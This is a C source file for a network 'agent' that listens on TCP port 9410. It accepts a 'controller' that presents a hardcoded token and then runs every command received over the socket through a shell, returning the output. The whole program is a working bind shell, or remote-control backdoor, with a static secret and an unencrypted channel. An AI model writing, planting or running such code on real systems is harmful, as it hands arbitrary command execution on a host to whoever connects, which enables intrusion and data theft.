#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 9410
#define AUTH_TOKEN "OPS-2851"

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt failed");
        exit(EXIT_FAILURE);
    }
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }
    
    printf("Agent started. Listening on port %d...\n", PORT);

    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    if (new_socket < 0) {
        perror("Accept failed");
        exit(EXIT_FAILURE);
    }
    printf("Controller connected!\n");

    int valread = read(new_socket, buffer, 1024);
    if (valread > 0) {
        if (strncmp(buffer, AUTH_TOKEN, 9) == 0) {
            printf("Authentication successful. Ready for commands.\n");
            send(new_socket, "AUTH_SUCCESS", 12, 0);
            
            // --- NEW COMMAND EXECUTION LOGIC ---
            while (1) {
                memset(buffer, 0, 1024);
                int cmd_read = read(new_socket, buffer, 1024);
                
                if (cmd_read <= 0 || strncmp(buffer, "exit", 4) == 0) {
                    printf("Controller disconnected.\n");
                    break;
                }
                
                printf("Executing: %s\n", buffer);
                FILE *fp = popen(buffer, "r");
                if (fp == NULL) {
                    send(new_socket, "Failed to run command\n", 22, 0);
                    continue;
                }
                
                char output[4096] = {0};
                int bytes_read = fread(output, 1, sizeof(output)-1, fp);
                if (bytes_read > 0) {
                    send(new_socket, output, bytes_read, 0);
                } else {
                    send(new_socket, "(Command executed without output)\n", 34, 0);
                }
                pclose(fp);
            }
        } else {
            printf("Authentication failed. Dropping connection.\n");
            send(new_socket, "AUTH_FAIL", 9, 0);
        }
    }

    close(new_socket);
    close(server_fd);
    return 0;
}
